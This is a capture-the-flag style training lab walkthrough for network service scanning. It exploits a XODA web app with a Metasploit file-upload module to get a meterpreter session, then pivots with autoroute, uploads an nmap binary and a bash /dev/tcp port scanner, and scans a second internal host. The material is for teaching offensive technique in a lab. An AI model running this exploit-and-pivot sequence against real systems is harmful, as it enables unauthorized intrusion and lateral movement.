---
description: Con pivoting su altra rete
---

# Lab T1046: Network Service Scanning

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/4752facd561777ab3da821bc716e5ac8ac9e7809901b447d3fd50c3cd082b18c.png)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo1.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/9ad3ca7ef7fb1b0534d3ebfed61966afce198011b8a0acbc99b3d7681750744d.png)

The target is reachable.

**Step 3:** Port scanning with Nmap

We can now perform a default Nmap port scan on the target to identify the open ports on the target system, this can be done by running the following command:

**Command:**

```
nmap demo1.ine.local
```

As shown in the following screenshot, the default Nmap scan does reveal open port 80.

![Content Image](https://assets.ine.com/lab/learningpath/241ff866ace37c3fe2c2703fccb87343e76abd4bb546ef2d2eade23d9be6cb0e.png)

**Step 4:** Check the HTTP content hosted on port 80 of the target machine

**Command:**

```
curl demo1.ine.local
```

As mentioned in the challenge, a XODA web app instance is running on the system which can be exploited using the “exploit/unix/webapp/xoda\_file\_upload” Metasploit module.

![Content Image](https://assets.ine.com/lab/learningpath/e13982bf02508588e7669f9c9926977f6c52cabda76e4fadce4ae898927028c7.png)

**Step 5:** Start msfconsole

**Command:**

```
msfconsole
```

![Content Image](https://assets.ine.com/lab/learningpath/479c90f0c826b0c6a5c399eff1b57465ea897a9a0ee3ccf734a4fe886f6dca4b.png)

**Step 6:** Select the mentioned module and set the parameter values

**Command:**

```
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/562c111dd2ee4b02b414a779db8e231b106b7886ac2aa8d63615451ccb1f3ae2.png)

A meterpreter session is spawned on the target machine.

**Step 7:** Start a command shell and identify the IP address range of the second target machine.

**Command:**

```
shell
ip addr
```

![Content Image](https://assets.ine.com/lab/learningpath/09ab812c4c44de348ec065649c92b487012c914b752cdc4af5b2c607a8bf049a.png)

The IP address of the first target machine on its eth1 interface is 192.180.108.2, the second target machine will be located at 192.180.108.3 on the second network.

**Step 8:** Add the route to Metasploit's routing table.

**Command:**

```
run autoroute -s 192.180.108.2
```

![Content Image](https://assets.ine.com/lab/learningpath/07968dcf96abbf22110539376991731891525735db33c9e8ebe57058c183bf4c.png)

**Step 9:** Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.

Press CTRL+z and Enter y to background the meterpreter session.

**Command:**

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/29da7e250ed2ac9f29eba96db3162fed0a2e7bf8930e95260a20fba581eff237.png)

**Step 10:** Check the static binaries available in the "/usr/bin/" directory.

**Command:**

```
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

![Content Image](https://assets.ine.com/lab/learningpath/febcb41de329b1e7454fdb6d1cf4d9413c00d4f9f90ced1d7f5f5015e278e200.png)

**Step 11:** Background the Metasploit session and create a bash port scanning script.

Press CTRL+z to background the Metasploit session.

Using the script provided at \[https://catonmat.net/tcp-port-scanner-in-bash] as a reference, create a bash script to scan the first 1000 ports

**Command:**

```
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

Save the script as bash-port-scanner.sh

![Content Image](https://assets.ine.com/lab/learningpath/a03d047c3ae7d17e3fa9fcbee0d73d58d9cff0477f5c5713bf1fe294dce0e57e.png)

**Step 12:** Foreground the Metasploit session and switch to the meterpreter session.

Press "fg" and press enter to foreground the Metasploit session.

**Command:**

```
sessions -i 1
```

![Content Image](https://assets.ine.com/lab/learningpath/8c9f59c24e771b90b19ccdc1d80af743da90106f6b726d804d162ab80e347648.png)

**Step 13:** Upload the nmap static binary and the bash port scanner script to the target machine.

**Command:**

```
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

![Content Image](https://assets.ine.com/lab/learningpath/c8faf7f1d158102bda7fad6f0c69e0786c2b1802dcdb4019648255ff32df3c88.png)

**Step 14:** Make the binary and script executable and use the bash script to scan the second target machine.

**Command:**

```
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

![Content Image](https://assets.ine.com/lab/learningpath/84762f9c9a39a0b12cf856a78b2415c5d4427ddea7774f17748850bf475d3551.png)

Three ports are open on the target machine, ports 21, 22 and 80.

**Step 15:** Using the nmap binary, scan the target machine for open ports.

**Command:**

```
./nmap -p- 192.180.108.3
```

![Content Image](https://assets.ine.com/lab/learningpath/920fb88f8b96c31ecbba0c054c1ee27593570e7d2540f6b47199b5bc3150226c.png)

The services running on the target machine are FTP, SSH and HTTP.

## References

* \[https://attack.mitre.org/techniques/T1046/]
